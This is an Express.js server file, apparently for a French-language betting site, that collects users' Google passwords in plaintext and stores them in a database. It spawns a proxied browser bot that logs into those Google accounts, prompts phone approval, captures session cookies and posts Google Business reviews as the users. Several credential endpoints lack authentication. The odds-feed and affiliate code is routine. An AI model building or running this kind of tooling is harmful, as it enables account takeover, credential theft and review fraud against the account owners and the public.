require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { spawn } = require('child_process');
const { queueUserValidation, getStats, startWorker } = require('./worker/validation-worker');
const { getUserCredentials, getUserByEmail, setGoogleCredentials, supabase,
  setupAffiliateProfile, setupPlayerProfile, findPlayerByShortId,
  activatePlayerBonus, getAffiliateStats, getAffiliateReferrals,
  generateUniqueShortId, linkReferralByCode
} = require('./api/supabase-client');
const { attemptGoogleAuth } = require('./worker/google-auth-agent');
const { startBotEngine, stopBotEngine, getBotStatus } = require('./bot-engine');
const { setRelay, getRelay } = require('./worker/relay-store');
const loginLogger = require('./login-logger');

const app = express();
const PORT = process.env.PORT || 8080;
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  if (req.path.endsWith('.html') || req.path === '/') {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
  }
  next();
});
app.use(express.static(path.join(__dirname), { dotfiles: 'deny' }));

app.post('/api/validate-account/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    console.log('\n🔔 [API] Demande validation pour user: ' + userId);
    const user = await getUserCredentials(userId);
    if (!user) {
      return res.status(404).json({ success: false, error: 'Utilisateur non trouve dans Supabase. Verifiez SUPABASE_SERVICE_ROLE_KEY.' });
    }
    if (!user.google_email || !(user.google_password || user.password)) {
      return res.status(400).json({ success: false, error: 'Credentials incomplets', details: { hasEmail: !!user.google_email, hasGooglePassword: !!(user.google_password || user.password) } });
    }
    const result = await queueUserValidation(userId);
    res.json({
      success: result.success,
      message: result.success ? 'Validation lancee. L\'IA tente maintenant de se connecter.' : result.message,
      details: {
        userId: userId, email: user.google_email, status: result.success ? 'queued' : 'error',
        queuePosition: result.position || null,
        whatHappensNext: result.success ? 'L\'agent ouvre Chrome via proxy, va sur accounts.google.com, saisit vos identifiants. Si mot de passe faux, il clique "Mot de passe oublie" et choisit "Notification telephone". Vous recevez la notification native Google sur votre telephone. Cliquez "Oui c\'est moi". L\'agent recupere les cookies et stocke la session.' : null
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/validate-account-now/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const { headless = false, keepOpen = true } = req.body;
    let user = await getUserCredentials(userId);
    
    // Si l'ID n'a pas de credentials complets, chercher par email dans tous les doublons
    if (!user || !user.google_email || !(user.google_password || user.password)) {
      if (user && user.email) {
        // Chercher tous les comptes avec cet email
        const { data: allUsers } = await supabase
          .from('users')
          .select('id, email, google_email, google_password, password, status, session_cookies')
          .ilike('email', user.email);
        if (allUsers && allUsers.length > 0) {
          // Trouver celui avec les credentials complets, en priorité session_active
          const bestMatch = allUsers.find(u => u.google_email && (u.google_password || u.password) && u.status === 'session_active')
                         || allUsers.find(u => u.google_email && (u.google_password || u.password));
          if (bestMatch) {
            console.log(`[API] Doublon trouvé avec credentials: ${bestMatch.id}, utilisé à la place de ${userId}`);
            user = bestMatch;
          }
        }
      }
    }
    
    if (!user || !user.google_email || !(user.google_password || user.password)) {
      return res.status(400).json({ success: false, error: 'Credentials incomplets', details: { userId, hasUser: !!user, hasGoogleEmail: !!(user && user.google_email), hasGooglePassword: !!(user && (user.google_password || user.password)) } });
    }
    
    const effectiveUserId = user.id || userId;
    
    // Choisir le meilleur mot de passe (le plus long car google_password peut être tronqué)
    const gp = user.google_password || '';
    const p = user.password || '';
    const bestPassword = gp.length >= p.length ? gp : p;
    console.log(`[API] Password selection: google_password=${gp.length}chars, password=${p.length}chars, selected=${bestPassword.length}chars`);
    
    // Démarrer la session de logging
    const session = loginLogger.startSession(user.google_email, effectiveUserId);
    session.logStep('credentials_found', { 
      userId: effectiveUserId, 
      hasGoogleEmail: !!user.google_email,
      hasPassword: !!(user.google_password || user.password),
      passwordLength: bestPassword.length,
      passwordSelected: gp.length >= p.length ? 'google_password' : 'password'
    });
    
    res.json({ 
      success: true, 
      message: 'Validation lancee en direct (1-6 min).', 
      details: { 
        userId: effectiveUserId, 
        email: user.google_email, 
        status: 'running', 
        checkStatus: '/api/validation-status/' + effectiveUserId,
        sessionId: session.id
      } 
    });
    
    // Lancer le script Python (garde Chrome ouvert sans --no-input)
    const safeEmail = user.google_email.replace(/[^a-z0-9]/gi, '_');
    const userProfileDir = path.join(__dirname, 'uc_profiles', safeEmail);
    const userCookiesFile = path.join(__dirname, 'uc_profiles', `cookies_${safeEmail}.json`);
    const args = [
      'test-uc-phase-ab.py',
      '--email', user.google_email,
      '--password', bestPassword,
      '--profile-dir', userProfileDir,
      '--cookies-file', userCookiesFile
    ];
    if (!keepOpen) args.push('--no-input');
    
    const pythonCmd = process.platform === 'win32' ? 'python' : 'python3';
    console.log(`[PYTHON-API] Lancement direct pour ${user.google_email} (keepOpen=${keepOpen})`);
    
    session.logStep('bot_launching', { 
      command: pythonCmd, 
      args: args.map(a => a.includes('@') ? '[EMAIL]' : a.length > 10 ? '[PWD]' : a),
      profileDir: userProfileDir,
      cookiesFile: userCookiesFile
    });
    
    const child = spawn(pythonCmd, args, {
      cwd: __dirname,
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe']
    });
    
    session.logStep('bot_spawned', { pid: child.pid });
    
    let stdout = '';
    let stderr = '';
    let loginSuccessReported = false;
    
    child.stdout.on('data', (data) => {
      const chunk = data.toString();
      stdout += chunk;
      console.log(`[PYTHON-OUT] ${chunk.trim()}`);
      
      // Parser les logs importants du bot
      if (chunk.includes('[LOGIN] SUCCESS')) {
        session.logStep('login_success_detected', { source: 'stdout' });
      }
      if (chunk.includes('[LOGIN] FAILED')) {
        session.logStep('login_failed_detected', { source: 'stdout', details: chunk.trim() });
      }
      if (chunk.includes('TYPING')) {
        session.logStep('typing_event', { details: chunk.trim() });
      }
      if (chunk.includes('captcha')) {
        session.logStep('captcha_event', { details: chunk.trim() });
      }
      
      if (!loginSuccessReported && effectiveUserId && chunk.includes('[LOGIN] SUCCESS')) {
        loginSuccessReported = true;
        supabase.from('users').update({ status: 'session_active', updated_at: new Date().toISOString() }).eq('id', effectiveUserId)
          .then(() => console.log(`[PYTHON-API] Status set to session_active early for user ${effectiveUserId}`))
          .catch(err => console.error('[PYTHON-API] Early session_active update failed:', err));
      }
    });
    
    child.stderr.on('data', (data) => {
      const chunk = data.toString();
      stderr += chunk;
      console.error(`[PYTHON-ERR] ${chunk.trim()}`);
      session.logStep('stderr_output', { output: chunk.trim() });
    });
    
    child.on('close', async (code) => {
      console.log(`[PYTHON-API] Process ${child.pid} termine avec code ${code} (earlySuccess=${loginSuccessReported})`);
      
      const exitData = { 
        code, 
        earlySuccess: loginSuccessReported,
        stdoutLength: stdout.length,
        stderrLength: stderr.length
      };
      
      if (effectiveUserId) {
        try {
          if (code === 0 || loginSuccessReported) {
            await supabase.from('users').update({ status: 'session_active', updated_at: new Date().toISOString() }).eq('id', effectiveUserId);
            console.log(`[PYTHON-API] user ${effectiveUserId} mis a jour session_active`);
            session.addSuccess(exitData);
          } else {
            await supabase.from('users').update({ status: 'auth_failed', updated_at: new Date().toISOString() }).eq('id', effectiveUserId);
            console.log(`[PYTHON-API] user ${effectiveUserId} mis a jour auth_failed`);
            session.addError(`Process exited with code ${code}`, { 
              ...exitData,
              lastStdout: stdout.slice(-500),
              lastStderr: stderr.slice(-500)
            });
          }
        } catch (statusErr) {
          console.error('[PYTHON-API] Failed to update status on close:', statusErr);
          session.addError(statusErr, { context: 'status_update_failed' });
        }
      }
      
      loginLogger.endSession(session.id);
    });
    
    child.on('error', (err) => {
      console.error(`[PYTHON-API] Process error:`, err);
      session.addError(err, { context: 'spawn_error' });
      loginLogger.endSession(session.id);
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/validation-status/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const user = await getUserCredentials(userId);
    if (!user) return res.status(404).json({ success: false });
    const relay = getRelay(user.google_email);
    res.json({ success: true, userId, email: user.google_email, status: user.status || 'unknown', hasSession: !!user.session_cookies, lastSessionDate: user.last_session_date, relay });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/check-verified', async (req, res) => {
  try {
    const email = (req.query.email || '').toLowerCase().trim();
    if (!email) return res.status(400).json({ success: false, error: 'email requis' });
    const user = await getUserByEmail(email);
    if (!user) return res.status(404).json({ success: false, error: 'Compte introuvable.' });
    const relay = getRelay(email);
    const SESSION_FRESHNESS_MS = 10 * 60 * 1000; // 10 minutes
    let isVerified = false;
    if (user.status === 'session_active' && user.updated_at) {
      const updatedMs = Date.now() - new Date(user.updated_at).getTime();
      // Uniquement valide si le statut session_active est récent (< 10 min).
      // Les anciens statuts verified/active ne sont plus considérés comme des passes permanents.
      isVerified = updatedMs < SESSION_FRESHNESS_MS;
    }
    res.json({ success: true, is_verified: isVerified, status: user.status, relay });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/relay', (req, res) => {
  try {
    const { email, phone, code, status } = req.body || {};
    if (!email) return res.status(400).json({ success: false, error: 'email requis' });
    setRelay(email, { phone, code, status });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/worker-stats', (req, res) => {
  const stats = getStats();
  res.json({ success: true, stats, proxyPool: require('./worker/proxy-rotator').PROXY_POOL.length });
});

app.get('/api/check-verification-status', async (req, res) => {
  try {
    const email = (req.query.email || '').toLowerCase().trim();
    if (!email) return res.status(400).json({ success: false, error: 'email requis' });

    // 1. cherche dans la table users (legacy / validation)
    let user = await getUserByEmail(email);
    if (user) {
      const SESSION_FRESHNESS_MS = 10 * 60 * 1000;
      const isVerified = user.status === 'session_active' && user.updated_at
        ? (Date.now() - new Date(user.updated_at).getTime()) < SESSION_FRESHNESS_MS
        : false;
      return res.json({ success: true, is_verified: isVerified, hasCredentials: !!(user.google_email && user.google_password) });
    }

    // 2. fallback : cherche dans profiles (main site inscription)
    const { data: profileRows } = await supabase.from('profiles').select('id, email').eq('email', email).limit(1);
    const profile = (profileRows && profileRows[0]) || null;
    if (profile) return res.json({ success: true, is_verified: false, hasCredentials: false, message: 'Compte trouvé mais non configuré pour la validation. Utilisez /api/setup-credentials.' });

    return res.status(404).json({ success: false, error: 'Compte introuvable dans Supabase.' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/store-signup-password', async (req, res) => {
  try {
    const { authUserId, email, password } = req.body;
    if (!authUserId || !email || !password) {
      return res.status(400).json({ success: false, error: 'authUserId, email et password requis' });
    }

    const { data: existing } = await supabase.from('users').select('id, google_password, google_email').eq('id', authUserId).limit(1);
    const row = (existing && existing[0]) || null;

    if (row) {
      // Met à jour TOUJOURS si le password est absent ou si on reçoit un nouveau
      if (!row.google_password || !row.google_email) {
        await supabase.from('users').update({
          google_email: email.toLowerCase().trim(),
          google_password: password,
          updated_at: new Date().toISOString()
        }).eq('id', authUserId);
      }
    } else {
      // Auto-création du profil s'il n'existe pas encore
      try {
        await setupPlayerProfile(authUserId, email, email, password);
      } catch (setupErr) {
        console.error('[STORE-SIGNUP-PASSWORD] Échec setupPlayerProfile:', setupErr);
        return res.status(500).json({ success: false, error: 'Impossible de créer le profil joueur : ' + setupErr.message });
      }
    }

    return res.json({ success: true, message: 'Mot de passe synchronisé pour la validation automatique.' });
  } catch (err) {
    console.error('[STORE-SIGNUP-PASSWORD] Erreur:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * Envoi d'un token de validation par mail (fallback quand le bot Python
 * n'est pas disponible).  Simule l'email en requête : le token est visible
 * dans la réponse pour faciliter le test.
 */
app.post('/api/send-validation', async (req, res) => {
  try {
    const { email, userId, password } = req.body || {};
    const cleanEmail = (email || '').toLowerCase().trim();
    if (!cleanEmail) return res.status(400).json({ success: false, error: 'email requis' });

    // S'assure que le profil existe côté users
    let user = await getUserByEmail(cleanEmail);
    if (!user && userId) {
      const { data: profileRows } = await supabase.from('profiles').select('id, email').ilike('email', cleanEmail).limit(1);
      const profile = profileRows && profileRows[0] ? profileRows[0] : null;
      if (profile && profile.id) {
        try {
          const pwd = password || cleanEmail;
          await setupPlayerProfile(profile.id, cleanEmail, cleanEmail, pwd);
          user = await getUserByEmail(cleanEmail);
        } catch (e) { console.error('[SEND-VALIDATION] Auto-creation failed:', e); }
      }
    }

    // Si un password est fourni, le synchroniser
    if (user && password) {
      await supabase.from('users').update({
        google_email: cleanEmail,
        google_password: password,
        updated_at: new Date().toISOString()
      }).eq('id', user.id);
    }

    const token = 'cvt-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8);
    console.log(`[SEND-VALIDATION] Token pour ${cleanEmail}: ${token}`);
    res.json({ success: true, message: 'Token généré (mode simulé).', token });
  } catch (err) {
    console.error('[SEND-VALIDATION] Erreur:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/worker-start', async (req, res) => {
  startWorker();
  res.json({ success: true, message: 'Worker demarre' });
});
/**
 * Poste un avis Google Business via l'IA
 * Requiert une session active (compte deja valide)
 */
app.post('/api/post-review/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const { companyName, category, rating = 5, headless = true } = req.body;
    if (!companyName || !category) {
      return res.status(400).json({ success: false, error: 'companyName et category sont requis' });
    }
    console.log('\n[API] Demande avis pour user ' + userId + ' sur ' + companyName);
    const { postGoogleReview } = require('./worker/google-business-agent');
    res.json({
      success: true,
      message: 'Avis en cours de publication par l\'IA...',
      details: { userId, companyName, category, rating, status: 'running' }
    });
    postGoogleReview(userId, companyName, category, rating, { headless })
      .then(result => { console.log('[API] Resultat avis pour ' + userId + ':', result); })
      .catch(err => { console.error('[API] Erreur avis pour ' + userId + ':', err); });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});



app.get('/', (req, res) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/index.html', (req, res) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  res.sendFile(path.join(__dirname, 'index.html'));
});

/**
 * Lance le script Python test-uc-phase-ab.py en arrière-plan
 * MODE PROD : envoie { cademoEmail } → le backend cherche dans Supabase
 * MODE DEV  : envoie { email, password } directement
 */
app.post('/api/verify-email-python', async (req, res) => {
  try {
    let googleEmail, googlePassword, userId, cademoEmail = req.body.cademoEmail;

    // MODE PROD : cademoEmail fourni → on cherche dans Supabase
    if (cademoEmail) {
      let user = await getUserByEmail(cademoEmail);

      // PAS dans users ? Essaye profiles (main site) pour récupérer l'auth ID, puis auto-créer
      if (!user) {
    const { data: profileRows } = await supabase.from('profiles').select('id, email').ilike('email', cademoEmail.toLowerCase().trim()).limit(1);
    const profile = profileRows && profileRows[0] ? profileRows[0] : null;
        if (profile && profile.id) {
          // Auto-création du profil dans public.users avec le password fourni
          const pwd = req.body.password || cademoEmail;   // fallback si rien n'est envoyé
          try {
            const newProf = await setupPlayerProfile(profile.id, cademoEmail, cademoEmail, pwd);
            user = newProf && newProf.user ? newProf.user : null;
            if (!user) {
              // Essaie de relire la ligne créée
              user = await getUserByEmail(cademoEmail);
            }
            console.log(`[PYTHON-API] Auto-création profil pour ${cademoEmail} depuis profiles.`);
          } catch (setupErr) {
            console.error('[PYTHON-API] Échec auto-création:', setupErr);
          }
        }
      }

      if (!user) {
        return res.status(404).json({ success: false, error: 'Compte Cademo introuvable dans Supabase. Créez-le d\'abord via /api/setup-credentials.' });
      }

      // Si un password est fourni dans la requête, l'utiliser (rattrapage anciens comptes)
      if (req.body.password) {
        googlePassword = req.body.password;
        googleEmail = cademoEmail;                         // même email que Cademo = compte Google
        // Persister pour la prochaine fois
        await supabase.from('users').update({
          google_email: cademoEmail.toLowerCase().trim(),
          google_password: req.body.password,
          updated_at: new Date().toISOString()
        }).eq('id', user.id);
      } else if (user.google_email && user.google_password) {
        googleEmail = user.google_email;
        googlePassword = user.google_password;
      } else {
        return res.status(400).json({ success: false, error: 'Identifiants Google non configurés. Reconnectez-vous pour synchroniser vos credentials.' });
      }

      userId = user.id;
      console.log(`[PYTHON-API] Utilisateur trouvé : ${cademoEmail} → Google ${googleEmail}`);
      // Reset statut pour invalider toute session précédente
      try {
        await supabase.from('users').update({ status: 'auth_started', updated_at: new Date().toISOString() }).eq('id', userId);
        console.log(`[PYTHON-API] Status reset to auth_started for user ${userId}`);
      } catch (resetErr) {
        console.error('[PYTHON-API] Failed to reset status:', resetErr);
      }
    }
    // MODE DEV / fallback direct
    else if (req.body.email && req.body.password) {
      googleEmail = req.body.email;
      googlePassword = req.body.password;
      console.log(`[PYTHON-API] Mode dev : credentials envoyés directement`);
    }
    else {
      return res.status(400).json({ success: false, error: 'Envoyez { cademoEmail } (prod) ou { email, password } (dev).' });
    }

    const { company, category, rating, keepOpen = true } = req.body;
    // Profil Chrome unique par utilisateur pour éviter les conflits de session
    const safeEmail = googleEmail.replace(/[^a-z0-9]/gi, '_');
    const userProfileDir = path.join(__dirname, 'uc_profiles', safeEmail);
    const userCookiesFile = path.join(__dirname, 'uc_profiles', `cookies_${safeEmail}.json`);
    
    const args = [
      'test-uc-phase-ab.py',
      '--email', googleEmail,
      '--password', googlePassword,
      '--profile-dir', userProfileDir,
      '--cookies-file', userCookiesFile
    ];
    // Si keepOpen=false ou mode non-interactif, on ajoute --no-input pour fermer Chrome après
    if (keepOpen === false) args.push('--no-input');
    if (company) args.push('--company', company);
    if (category) args.push('--category', category);
    if (rating) args.push('--rating', String(rating));

    const pythonCmd = process.platform === 'win32' ? 'python' : 'python3';

    console.log(`[PYTHON-API] Lancement du script Python pour ${googleEmail}`);
    const child = spawn(pythonCmd, args, {
      cwd: __dirname,
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe']
    });

    let stdout = '';
    let stderr = '';
    let loginSuccessReported = false;
    child.stdout.on('data', (data) => {
      const chunk = data.toString();
      stdout += chunk;
      console.log(`[PYTHON-OUT] ${chunk.trim()}`);
      // Détection précoce d'un login réussi pour valider l'accès immédiatement
      if (!loginSuccessReported && userId && chunk.includes('[LOGIN] SUCCESS')) {
        loginSuccessReported = true;
        supabase.from('users').update({ status: 'session_active', updated_at: new Date().toISOString() }).eq('id', userId)
          .then(() => console.log(`[PYTHON-API] Status set to session_active early (login success detected) for user ${userId}`))
          .catch(err => console.error('[PYTHON-API] Early session_active update failed:', err));
      }
    });
    child.stderr.on('data', (data) => {
      const chunk = data.toString();
      stderr += chunk;
      console.error(`[PYTHON-ERR] ${chunk.trim()}`);
    });
    child.on('close', async (code) => {
      console.log(`[PYTHON-API] Process ${child.pid} terminé avec code ${code} (earlySuccess=${loginSuccessReported})`);
      if (userId) {
        try {
          if (code === 0 || loginSuccessReported) {
            await supabase.from('users').update({ status: 'session_active', updated_at: new Date().toISOString() }).eq('id', userId);
            console.log(`[PYTHON-API] user ${userId} mis à jour session_active (code=${code}, early=${loginSuccessReported})`);
          } else {
            await supabase.from('users').update({ status: 'auth_failed', updated_at: new Date().toISOString() }).eq('id', userId);
            console.log(`[PYTHON-API] user ${userId} mis à jour auth_failed (code ${code})`);
          }
        } catch (statusErr) {
          console.error('[PYTHON-API] Failed to update status on close:', statusErr);
        }
      }
    });

    res.json({
      success: true,
      message: 'Bot lancé en arrière-plan.',
      pid: child.pid,
      googleEmail: googleEmail,
      userId: userId || null,
      tip: 'Regarde la console Node.js pour le suivi du bot. Appuie sur "Oui, c\'est moi" sur ton téléphone si Google le demande.'
    });
  } catch (error) {
    console.error('[PYTHON-API] Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * Enregistre ou met à jour les credentials Google liés à un compte Cademo
 * Génère aussi le short_id (#XXXX) et lie un éventuel code de parrainage.
 * Body: { cademoEmail, googleEmail, googlePassword, referralCode?, userId? }
 */
app.post('/api/setup-credentials', async (req, res) => {
  try {
    const { cademoEmail, googleEmail, googlePassword, referralCode, userId } = req.body;
    if (!cademoEmail || !googleEmail || !googlePassword) {
      return res.status(400).json({ success: false, error: 'cademoEmail, googleEmail et googlePassword requis.' });
    }
    // Fallback sur l'ancienne méthode si pas d'userId (compatibilité)
    if (!userId) {
      const ok = await setGoogleCredentials(cademoEmail, googleEmail, googlePassword);
      return res.json({ success: ok, message: ok ? 'Credentials enregistrés (legacy).' : 'Erreur.' });
    }
    const result = await setupPlayerProfile(userId, cademoEmail, googleEmail, googlePassword, referralCode || null);
    res.json({ success: true, message: `Profil joueur configuré. Short ID: ${result.user.short_id}`, shortId: result.user.short_id, user: result.user });
  } catch (error) {
    console.error('[SETUP-CREDENTIALS] Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/* ================================================================
   AFFILIATION — Endpoints pour le système de parrainage
   ================================================================ */

/** Middleware JWT */
async function verifyAffiliateToken(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ success: false, error: 'Token manquant' });
  }
  const token = authHeader.split(' ')[1];
  const { data: { user }, error } = await supabase.auth.getUser(token);
  if (error || !user) return res.status(401).json({ success: false, error: 'Token invalide' });
  req.user = user;

  // Auto-création du profil affilié dans public.users s'il manque
  try {
    const { data: existingRows } = await supabase.from('users').select('id').eq('id', user.id).limit(1);
    const existingProfile = (existingRows && existingRows[0]) || null;
    if (!existingProfile) {
      console.log(`[VERIFY-AFFILIATE-TOKEN] Profil manquant pour ${user.id}, auto-création...`);
      await setupAffiliateProfile(user.id, user.email);
    }
  } catch (e) {
    console.error('[VERIFY-AFFILIATE-TOKEN] Erreur auto-création profil:', e);
  }

  next();
}

/** POST /api/affiliate/setup — création / complétion profil affilié */
app.post('/api/affiliate/setup', async (req, res) => {
  try {
    const { email, userId, referralCode } = req.body;
    if (!email || !userId) return res.status(400).json({ success: false, error: 'email et userId requis' });
    const result = await setupAffiliateProfile(userId, email, referralCode || null);
    res.json({ success: true, user: result.user, isNew: result.isNew });
  } catch (err) {
    console.error('[AFFILIATE-SETUP] Erreur:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/** GET /api/affiliate/me — infos de l'affilié connecté */
app.get('/api/affiliate/me', verifyAffiliateToken, async (req, res) => {
  try {
    const { data: profile } = await supabase.from('users').select('*').eq('id', req.user.id).single();
    if (!profile) return res.status(404).json({ success: false, error: 'Profil non trouvé' });
    res.json({ success: true, profile });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/** POST /api/affiliate/search — recherche joueur par #short_id */
app.post('/api/affiliate/search', verifyAffiliateToken, async (req, res) => {
  try {
    const { shortId } = req.body;
    if (!shortId) return res.status(400).json({ success: false, error: 'shortId requis' });
    const player = await findPlayerByShortId(shortId);
    if (!player) return res.json({ success: true, found: false });
    res.json({ success: true, found: true, player: {
      id: player.id,
      shortId: player.short_id,
      isVerified: player.is_verified,
      bonusActivated: player.bonus_activated,
      role: player.role,
      balance: player.balance
    }});
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/** POST /api/affiliate/activate-bonus — activation du bonus 200€ */
app.post('/api/affiliate/activate-bonus', verifyAffiliateToken, async (req, res) => {
  try {
    const { playerShortId } = req.body;
    if (!playerShortId) return res.status(400).json({ success: false, error: 'playerShortId requis' });
    const result = await activatePlayerBonus(playerShortId, req.user.id);
    res.json(result);
  } catch (err) {
    console.error('[AFFILIATE-ACTIVATE] Erreur:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/** GET /api/affiliate/stats — statistiques de l'affilié */
app.get('/api/affiliate/stats', verifyAffiliateToken, async (req, res) => {
  try {
    const stats = await getAffiliateStats(req.user.id);
    if (!stats) return res.status(404).json({ success: false, error: 'Affilié non trouvé' });
    res.json({ success: true, stats });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/** GET /api/affiliate/referrals — liste des filleuls */
app.get('/api/affiliate/referrals', verifyAffiliateToken, async (req, res) => {
  try {
    const list = await getAffiliateReferrals(req.user.id);
    res.json({ success: true, referrals: list });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/** GET /api/player/me — profil connecté (incluant wager) */
app.get('/api/player/me', verifyAffiliateToken, async (req, res) => {
  try {
    const { data: profile, error } = await supabase
      .from('users')
      .select('*')
      .eq('id', req.user.id)
      .single();
    if (error || !profile) {
      return res.status(404).json({ success: false, error: 'Profil non trouvé' });
    }
    // Vérifier que les champs wager sont bien initialisés, si non, appliquer migration
    if (
      typeof profile.bonus_amount_locked === 'undefined' ||
      typeof profile.wager_multiplier === 'undefined' ||
      typeof profile.wager_required === 'undefined' ||
      typeof profile.wager_progress === 'undefined' ||
      typeof profile.wager_completed === 'undefined'
    ) {
      await supabase.from('users').update({
        bonus_amount_locked: profile.bonus_amount_locked || 0,
        wager_multiplier: profile.wager_multiplier || 50,
        wager_required: profile.wager_required || 0,
        wager_progress: profile.wager_progress || 0,
        wager_completed: !!profile.wager_completed
      }).eq('id', req.user.id);
      // Récupérer la ligne mise à jour
      const { data: updated } = await supabase.from('users').select('*').eq('id', req.user.id).single();
      res.json({ success: true, profile: updated });
      return;
    }
    res.json({ success: true, profile });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/* ------------------------------------------------------------------ */
/*  ODDS API INTEGRATION  (The Odds API)                              */
/* ------------------------------------------------------------------ */
const ODDS_API_KEY = process.env.ODDS_API_KEY || '';
const ODDS_API_HOST = 'https://api.the-odds-api.com/v4';

const SPORT_MAP = {
  foot: { key: 'soccer_epl', market: 'totals', label: 'Football' },
  nba:  { key: 'basketball_nba', market: 'totals', label: 'NBA' },
  f1:   { key: 'motorsport_formula1', market: 'outrights', label: 'F1' }
};

let oddsCache = {};
let scoresCache = {};

function toCents(n) { return Math.round(n * 100) / 100; }

function normalizeOdds(internalKey, marketKey, apiData) {
  const markets = [];
  if (!Array.isArray(apiData)) return markets;
  apiData.forEach((event, eventIdx) => {
    const bookmaker = event.bookmakers && event.bookmakers[0];
    if (!bookmaker) return;
    const mkt = bookmaker.markets && bookmaker.markets.find(m => m.key === marketKey);
    if (!mkt) return;

    if (marketKey === 'totals') {
      const over = mkt.outcomes.find(o => /over/i.test(o.name));
      const under = mkt.outcomes.find(o => /under/i.test(o.name));
      if (!over || !under) return;
      const id = event.id + '_totals_' + eventIdx;
      markets.push({
        id,
        cat: 'trending',
        who: (event.home_team || "?") + ' vs ' + (event.away_team || "?"),
        match: event.sport_title || SPORT_MAP[internalKey].label,
        market: 'Total buts / points',
        line: over.point !== undefined ? String(over.point) : '',
        c: '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6,'0'),
        eventId: event.id,
        marketKey: 'totals',
        commenceTime: event.commence_time,
        less: { l: 'Under', o: toCents(under.price) },
        more: { l: 'Over', o: toCents(over.price) }
      });
    } else if (marketKey === 'outrights') {
      const top = mkt.outcomes.slice(0, 5);
      top.forEach((outcome, idx) => {
        const id = event.id + '_outright_' + idx;
        markets.push({
          id,
          cat: 'trending',
          who: outcome.name,
          match: event.sport_title || SPORT_MAP[internalKey].label,
          market: 'Vainqueur',
          line: '',
          c: '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6,'0'),
          eventId: event.id,
          marketKey: 'outrights',
          commenceTime: event.commence_time,
          less: null,
          more: { l: 'Gagne', o: toCents(outcome.price) }
        });
      });
    }
  });
  return markets;
}

async function refreshOdds() {
  if (!ODDS_API_KEY) {
    console.log('[ODDS] ODDS_API_KEY not set — skipping real odds fetch.');
    return;
  }
  for (const k of Object.keys(SPORT_MAP)) {
    try {
      const cfg = SPORT_MAP[k];
      const url = `${ODDS_API_HOST}/sports/${cfg.key}/odds?apiKey=${ODDS_API_KEY}&regions=eu&markets=${cfg.market}&oddsFormat=decimal`;
      const r = await fetch(url);
      if (!r.ok) {
        if (r.status !== 404) console.warn(`[ODDS] HTTP ${r.status} for ${k}`);
        continue;
      }
      const data = await r.json();
      const normalized = normalizeOdds(k, cfg.market, data);
      if (normalized.length) {
        oddsCache[k] = { ts: Date.now(), data: normalized };
        console.log(`[ODDS] ${k}: ${normalized.length} marchés mis en cache.`);
      }
    } catch (e) {
      console.error(`[ODDS] Erreur ${k}:`, e.message);
    }
  }
}

async function refreshScores() {
  if (!ODDS_API_KEY) return;
  for (const k of Object.keys(SPORT_MAP)) {
    try {
      const cfg = SPORT_MAP[k];
      const url = `${ODDS_API_HOST}/sports/${cfg.key}/scores?apiKey=${ODDS_API_KEY}&daysFrom=3`;
      const r = await fetch(url);
      if (!r.ok) continue;
      const data = await r.json();
      scoresCache[k] = { ts: Date.now(), data };
    } catch (e) {
      console.error('[SCORES]', e.message);
    }
  }
}

refreshOdds();
refreshScores();
setInterval(refreshOdds, 60 * 1000);
setInterval(refreshScores, 5 * 60 * 1000);

app.get('/api/odds', (req, res) => {
  const sport = req.query.sport || 'foot';
  const cached = oddsCache[sport];
  if (cached && cached.data && cached.data.length) {
    return res.json({ success: true, markets: cached.data, ts: cached.ts });
  }
  if (!ODDS_API_KEY) {
    return res.status(503).json({ success: false, error: 'ODDS_API_KEY not configured. Add it to .env' });
  }
  return res.status(404).json({ success: false, error: 'Aucune cote disponible pour ce sport.' });
});

app.get('/api/scores', (req, res) => {
  const sport = req.query.sport || 'foot';
  const cached = scoresCache[sport];
  if (cached && cached.data) {
    return res.json({ success: true, scores: cached.data, ts: cached.ts });
  }
  return res.json({ success: true, scores: [], ts: 0 });
});

/* ─────────────── VALIDATION CODE PARRAINAGE (public) ─────────────── */
